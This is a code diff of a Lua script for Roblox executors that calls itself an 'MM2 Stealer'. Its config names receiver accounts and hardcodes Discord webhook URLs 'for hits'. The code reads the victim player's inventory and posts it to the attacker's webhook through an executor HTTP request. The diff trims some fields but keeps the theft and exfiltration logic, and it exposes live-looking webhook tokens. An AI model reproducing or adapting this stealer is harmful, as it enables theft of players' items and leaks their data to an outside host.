@@ -2,15 +2,9 @@ Config = {
     Receivers = {"123123", "123123123"}, -- Your Username/s.
     Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
     FullInventory = true, -- If true, it will display all of the player's items.
-    GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
-    ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
-    Script = "None", -- Scripts > "None", "Custom", "Highlight Hub".
-    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
 }
 
 repeat wait() until game:IsLoaded()
-
-
 
 LogsWebhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b"
 -- Logs Webhook
@@ -24,7 +18,6 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 
 local Inventory = {}
@@ -112,11 +105,12 @@ local success, errorMsg = pcall(function()
         embeds = {
             {
                 title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
-                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
+                description = "🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
                 color = tonumber(0x3365FF),
             }
         }
     }
+    
 
     local request = http_request or request or HttpPost or syn.request
     request({
